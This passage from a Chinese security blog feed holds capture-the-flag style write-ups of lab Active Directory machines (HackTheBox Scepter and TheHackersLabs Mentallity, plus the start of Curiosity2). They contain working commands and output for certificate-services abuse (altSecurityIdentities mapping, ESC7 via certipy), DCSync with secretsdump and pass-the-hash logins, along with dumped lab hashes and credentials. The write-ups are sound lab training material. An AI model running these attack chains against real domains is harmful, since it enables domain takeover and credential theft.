    serial = serial.replace(':', '').lower()
    serial_bytes = bytearray.fromhex(serial)
    serial_bytes.reverse()
    serial_hex = ''.join(['%02x' % b for b in serial_bytes])
    
    # 拆分 issuer，并反转顺序
    issuer_parts = issuer.split(',')
    issuer_parts = [p.strip() for p in issuer_parts]
    issuer_parts.reverse()  # 反转顺序，这里不改
    issuer_str = ','.join(issuer_parts)
    
    # 调整输出顺序：确保 "DC=scepter,DC=htb" 在 "CN=scepter-DC01-CA" 之前
    issuer_str = issuer_str.replace("CN=", "").replace("DC=", "CN=").replace(",", ",DC=").strip()
    
    print(f"X509:<I>{issuer_str}<SR>{serial_hex}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-serial', required=True, help='Certificate serial (colon separated)')
    parser.add_argument('-issuer', required=True, help='Certificate issuer')
    args = parser.parse_args()
    
    convert(args.serial, args.issuer)
```

```bash
➜  Scepter python Get-X509IssuerSerialNumberFormat.py
X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>B10000000000E53497D2AD1DCC20B100000026
```

通过 PowerShell 更改用户 h.brown 的 `altSecurityIdentities` 属性（GPT）

```bash
$map = 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>2800000000008dde9c88b25b6ad22800000062'
Set-ADUser p.adams -Replace @{altSecurityIdentities=$map}
```

```bash
meterpreter > shell
Process 4920 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.7131]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\h.brown\Documents>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\h.brown\Documents> $map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'
$map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'
PS C:\Users\h.brown\Documents> Set-ADUser -Identity "p.adams" -Replace @{altSecurityIdentities=$map}
Set-ADUser -Identity "p.adams" -Replace @{altSecurityIdentities=$map}
```

查看更改后的属性值

```bash
Get-ADUser -Identity "p.adams" -Properties altSecurityIdentities | Select-Object altSecurityIdentities
```

通过 `certipy` 根据计算机账户的证书 `ciallo.pfx` 申请用户 `p.adams` 的 `TGT`

```bash
➜  Scepter certipy-ad auth -pfx ciallo.pfx -dc-ip 10.10.11.65 -username p.adams
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] The provided username does not match the identification found in the provided certificate: 'P.ADAMS' - 'ciallo$'
Do you want to continue? (Y/n) y
[*] Using principal: p.adams@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image6.png)

直接 `DCSync`

```bash
➜  Scepter secretsdump.py -k -no-pass dc01.scepter.htb -dc-ip 10.10.11.65                                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
                                                                                                               
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
...many...
```

```bash
➜  Scepter evil-winrm -i dc01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
fcd40eb94aeca1942488f8decb6cc0b7
```

## 总结

反正就是每次打AD都是不会的，靠大佬带过的…

第一次遇到 ADCS 类的攻击，无从下手，任重道远。
]]></content:encoded>
            <category>靶机</category>
            <category>Windows靶机</category>
            <category>HackTheBox</category>
            <category>ADCS</category>
            <category>ESC</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Mentallity]]></title>
            <link>https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity</guid>
            <pubDate>Wed, 23 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Mentallity https://labs.thehackerslabs.com/machine/120 Recon PortScan namp 端口扫描 貌似是双网卡 枚举测试 SMB 匿名账户测试 FTP 匿名测试 HTTP HTTP 80 HTTP 8080 发现一个登录页面 我们点击登录...]]></description>
            <content:encoded><![CDATA[
# Mentallity

> https://labs.thehackerslabs.com/machine/120
> 

![image.png](/post-images/TheHackersLabsMentallity/image.png)

## Recon

### PortScan

`namp` 端口扫描

```bash
➜  Mentallity nmap -sn 192.168.56.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:45 CST
Nmap scan report for 192.168.56.1
Host is up (0.00032s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00027s latency).
MAC Address: 08:00:27:3B:D1:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.28
Host is up (0.00024s latency).
MAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.91
Host is up (0.00028s latency).
MAC Address: 08:00:27:11:40:07 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 27.97 seconds
```

貌似是双网卡

```bash
➜  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.28
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST 
Warning: 192.168.56.28 giving up on port because retransmission cap hit (10). 
Nmap scan report for 192.168.56.28              
Host is up (0.00057s latency).                  
Not shown: 63744 closed tcp ports (conn-refused), 1762 filtered tcp ports (no-response)
PORT      STATE SERVICE                         
21/tcp    open  ftp                             
53/tcp    open  domain                          
80/tcp    open  http                            
88/tcp    open  kerberos-sec                    
135/tcp   open  msrpc                           
139/tcp   open  netbios-ssn                     
389/tcp   open  ldap                            
445/tcp   open  microsoft-ds                    
464/tcp   open  kpasswd5                        
593/tcp   open  http-rpc-epmap                  
636/tcp   open  ldapssl                         
3268/tcp  open  globalcatLDAP                   
3269/tcp  open  globalcatLDAPssl                
5985/tcp  open  wsman                           
8080/tcp  open  http-proxy                      
9389/tcp  open  adws                            
47001/tcp open  winrm  
...    

➜  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.91
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST
Warning: 192.168.56.91 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.91
Host is up (0.00024s latency).
Not shown: 63929 closed tcp ports (conn-refused), 1577 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm    
...     
```

```bash
➜  Mentallity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.28
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:49 CST
Nmap scan report for 192.168.56.28
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ssl-date: 2025-07-23T12:50:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=VulnFTP
| Subject Alternative Name: DNS:VulnFTP
| Not valid before: 2025-07-17T09:01:44
|_Not valid after:  2026-07-17T09:21:44
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 12:50:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
|_ssl-date: TLS randomness does not represent time                                                                                                                                              
445/tcp   open  microsoft-ds?                                                                                                                                                                   
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mentality \xC2\xB7 Innovating Beyond Limits
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2022 (99%), Microsoft Windows Server 2016 or Server 2019 (97%), Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows 11 21H2 (96%), Windows Server 2019 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 1703 (94%), Microsoft Windows 10 1507 - 1607 (94%), Microsoft Windows Server 2012 or 2012 R2 (94%), Microsoft Windows Server 2012 R2 Update 1 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: WIN-9FQTT7GPAVK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-23T12:50:48
|_  start_date: N/A
|_nbstat: NetBIOS name: WIN-9FQTT7GPAVK, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c2:70:8b (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.56.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.86 seconds
```

### 枚举测试

`SMB` 匿名账户测试

```bash
➜  Mentallity nxc smb 192.168.56.28 -u anonymous -p '' --smb-timeout 9999
SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [-] mentality.thl\anonymous: STATUS_LOGON_FAILURE
```

FTP 匿名测试

```bash
➜  Mentallity ftp 192.168.56.28                      
Connected to 192.168.56.28.
220 Microsoft FTP Service
Name (192.168.56.28:root): anonymous
331 Password required
Password: 
530 User cannot log in.
ftp: Login failed
```

### HTTP

HTTP - 80

![image.png](/post-images/TheHackersLabsMentallity/image1.png)

```bash
➜  Mentallity feroxbuster --url http://192.168.56.28 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.28
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [asp, php, txt, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      334l     2089w   180418c http://192.168.56.28/iisstart.png
200      GET       32l       55w      703c http://192.168.56.28/
[####################] - 2m   1038160/1038160 0s      found:2       errors:0
[####################] - 2m   1038145/1038145 10180/s http://192.168.56.28/
```

HTTP - 8080

![image.png](/post-images/TheHackersLabsMentallity/image2.png)

发现一个登录页面

![image.png](/post-images/TheHackersLabsMentallity/image3.png)

我们点击登录的时候发现很奇怪，因为并没有提交数据

然后可以注意到只加载了一个 `JS` 脚本

![image.png](/post-images/TheHackersLabsMentallity/image4.png)

脚本内容

```bash
function validateForm() {
    const u = document.getElementById("username").value;
    const p = document.getElementById("password").value;
    const errorMessage = document.getElementById("errorMessage");

    if (u === "admin" && p === "adminpass123") {
        window.location.href = "dashboard.html";
        return false;
    }
    errorMessage.textContent = "Invalid Username Or Password!";
    return false;
}
```

我们直接转到 `ashboard.html`

![image.png](/post-images/TheHackersLabsMentallity/image5.png)

得到一串 `BASE64` 编码后的字符串，解密后得到 `FTP`的账户

![image.png](/post-images/TheHackersLabsMentallity/image6.png)

发现里面有三个文件

```bash
➜  Mentallity ftp 192.168.56.28
Connected to 192.168.56.28.
220 Microsoft FTP Service
Name (192.168.56.28:root): ftpuser 
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||54349|)
125 Data connection already open; Transfer starting.
07-17-25  08:52AM              1608612 ad_hc_mentality_htl.html
07-17-25  05:48AM                   34 flag.txt
07-17-25  12:13AM                   75 web.config
226 Transfer complete.
ftp> 
```

其中这个就是 `user.txt`

```bash
➜  Mentallity cat flag.txt      
FLAG{thisxxxxxxxxxxxxxxxxxxxxxx
```

另外一个 `HTML` 文件是安全分析结果，是关于域的

![image.png](/post-images/TheHackersLabsMentallity/image7.png)

在报告中能得到一个凭据 `svcapp1`:`Hola1234$` ，并且也知道了 `ftpuser` 也是可以在域中进行认证的

![image.png](/post-images/TheHackersLabsMentallity/image8.png)

测试凭据

```bash
➜  Mentallity nxc smb 192.168.56.28 -u 'svcapp1' -p 'Hola1234$' --smb-timeout 9999                  
SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [+] mentality.thl\svcapp1:Hola1234$

➜  Mentallity nxc ldap 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'               
LDAP        192.168.56.28   389    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)
LDAPS       192.168.56.28   636    WIN-9FQTT7GPAVK  [+] mentality.thl\svcapp1:Hola1234$
 
➜  Mentallity nxc winrm 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'
WINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [-] mentality.thl\svcapp1:Hola1234$ 
```

`SMB` 文件列表

```bash
➜  192.168.56.28 tree
.
└── SYSVOL
    └── mentality.thl
        └── Policies
            ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
            │   ├── GPT.INI
            │   └── MACHINE
            │       ├── Microsoft
            │       │   └── Windows NT
            │       │       └── SecEdit
            │       │           └── GptTmpl.inf
            │       └── Registry.pol
            └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
                ├── GPT.INI
                └── MACHINE
                    └── Microsoft
                        └── Windows NT
                            └── SecEdit
                                └── GptTmpl.inf
```

## 域分析

收集信息

```bash
➜  Mentallity bloodhound-python -d 'mentality.thl' -ns 192.168.56.28 --zip -c All -dc 'WIN-9FQTT7GPAVK.mentality.thl' -u svcapp1 -p 'Hola1234$'                                                
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mentality.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 6 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN-9FQTT7GPAVK.mentality.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250723214935_bloodhound.zip
```

用户组

![image.png](/post-images/TheHackersLabsMentallity/image9.png)

翻了半天并没有发现什么可以利用的

## ESC 7

使用 `certipy-ad` 枚举一下证书漏洞

```bash
➜  Mentallity certipy-ad -debug find -dc-ip 192.168.56.28 -u svcapp1 -p Hola1234$ -vulnerable -text -target WIN-9FQTT7GPAVK.mentality.thl  
```

发现 `ESC 7`

```bash
➜  Mentallity cat 20250723221243_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : mentality-WIN-9FQTT7GPAVK-CA
    DNS Name                            : WIN-9FQTT7GPAVK.mentality.thl
    Certificate Subject                 : CN=mentality-WIN-9FQTT7GPAVK-CA, DC=mentality, DC=thl
    Certificate Serial Number           : 52F256456C27B2834A8DCCF7EE745646
    Certificate Validity Start          : 2025-07-17 13:46:02+00:00
    Certificate Validity End            : 2045-07-17 13:56:02+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MENTALITY.THL\Administrators
      Access Rights
        Enroll                          : MENTALITY.THL\Authenticated Users
                                          MENTALITY.THL\svcapp1
        ManageCa                        : MENTALITY.THL\svcapp1
                                          MENTALITY.THL\Domain Admins
                                          MENTALITY.THL\Enterprise Admins
                                          MENTALITY.THL\Administrators
        ManageCertificates              : MENTALITY.THL\Domain Admins
                                          MENTALITY.THL\Enterprise Admins
                                          MENTALITY.THL\Administrators
    [+] User Enrollable Principals      : MENTALITY.THL\Authenticated Users
                                          MENTALITY.THL\svcapp1
    [+] User ACL Principals             : MENTALITY.THL\svcapp1
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

跟着文档打即可

文档链接：https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca

```bash
➜  Mentallity certipy-ad ca \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer 'svcapp1'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'svcapp1' on 'mentality-WIN-9FQTT7GPAVK-CA'
```

```bash
➜  Mentallity certipy ca \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'mentality-WIN-9FQTT7GPAVK-CA'
```

```bash
➜  Mentallity certipy req \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template 'SubCA' \
    -upn 'administrator@mentality.thl' -sid 'S-1-5-21-1896710242-59548724-504912181-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '5.key'
[*] Wrote private key to '5.key'
[-] Failed to request certificate
```

```bash
➜  Mentallity certipy ca \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request '5'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 5
```

```bash
➜  Mentallity certipy req \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -retrieve '5'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 5
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@mentality.thl'
[*] Certificate object SID is 'S-1-5-21-1896710242-59548724-504912181-500'
[*] Loaded private key from '5.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

获取 `HASH`

```bash
➜  Mentallity certipy-ad auth -pfx 'administrator.pfx' -domain "mentality.thl" -dc-ip 192.168.56.28
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@mentality.thl'
[*]     SAN URL SID: 'S-1-5-21-1896710242-59548724-504912181-500'
[*]     Security Extension SID: 'S-1-5-21-1896710242-59548724-504912181-500'
[*] Using principal: 'administrator@mentality.thl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@mentality.thl': aad3b435b51404xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd04a6bd959f95ce2b2
```

读取 `root.txt`

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat root_flag.txt
4042xxxxxxxxxxxxxxxxxxxxxx
```

## 总结

不难，但是差一点点就首杀了！！！！！！！！！！！！！！！！

就五分钟！！]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
            <category>ESC7</category>
            <category>FTP</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Curiosity2]]></title>
            <link>https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2</guid>
            <pubDate>Sat, 19 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Curiosity2 https://labs.thehackerslabs.com/machine/103 Recon PortScan nmap 端口扫描 枚举测试 测试 SMB 匿名账户 再看一眼 wireshark ，依旧有 LLMNR包，并且从数据包可以看出来是在查询 SQLserver ...]]></description>
            <content:encoded><![CDATA[
# Curiosity2

> https://labs.thehackerslabs.com/machine/103
> 

![image.png](/post-images/TheHackersLabsCuriosity2/image.png)

## Recon

### PortScan

`nmap` 端口扫描

```bash
➜  Curiosity2 nmap -sT -min-rate 10000 -p- 192.168.56.116 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:40 CST
Warning: 192.168.56.116 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.116
Host is up (0.00030s latency).
Not shown: 64872 closed tcp ports (conn-refused), 638 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49684/tcp open  unknown
49685/tcp open  unknown
49689/tcp open  unknown
49693/tcp open  unknown
49704/tcp open  unknown
57936/tcp open  unknown
60031/tcp open  unknown
MAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
➜  Curiosity2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.116
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:41 CST
Nmap scan report for 192.168.56.116
Host is up (0.00086s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 11:41:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
